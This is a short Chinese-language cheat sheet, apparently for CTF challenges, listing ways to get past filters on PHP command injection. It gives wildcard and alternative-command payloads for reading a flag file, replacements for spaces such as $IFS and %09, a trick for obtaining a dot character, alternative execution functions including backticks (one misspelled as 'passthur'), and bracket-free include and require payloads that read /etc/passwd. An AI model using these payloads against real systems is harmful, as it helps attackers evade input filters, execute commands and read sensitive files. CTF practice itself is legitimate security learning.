    命令执行常用绕过方法

    过滤了指定字符串

    • system("cat fl*g.php") : 使用通配符
    • system("tac f???????") : 使用通配符
    • system("tac fl*g.php") : 过滤 cat ,倒序输出文本
    • system("nl fl*g.php") : 过滤 cat 、 tac
    • system("cp fl*g.php 1.txt | cat 1.txt") : 访问 1.txt

    过滤空格

    • 使用TAB键 %09 代替
    • 使用 {$IFS} 代替
    • $IFS$9 绕过
    • <>
    • <
    • ,
    • %0a

    可以依次尝试，不一定全都可以绕过

    过滤小数点

    • 使用 pos(localeconv) 来获取小数点: localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点

    常见命令执行函数

    当题目过滤某个函数时候，可以尝试使用其他函数

    • system()
    • passthur()
    • shell_exec()
    • echo `cat flag.php` : 反引号（用于命令替换，即将反引号中命令的输出作为另一个命令的参数。也就是说，命令替换会先执行反引号中的命令，然后将其输出作为外部命令的一部分进行处理

    PHP 不需要括号的函数

    • print 123
    • include "/etc/passwd"
    • require "/etc/passwd"
    • include_once "/etc/passwd"
    • require_once "/etc/passwd"

    可以在题目中过滤了括号的情况下尝试
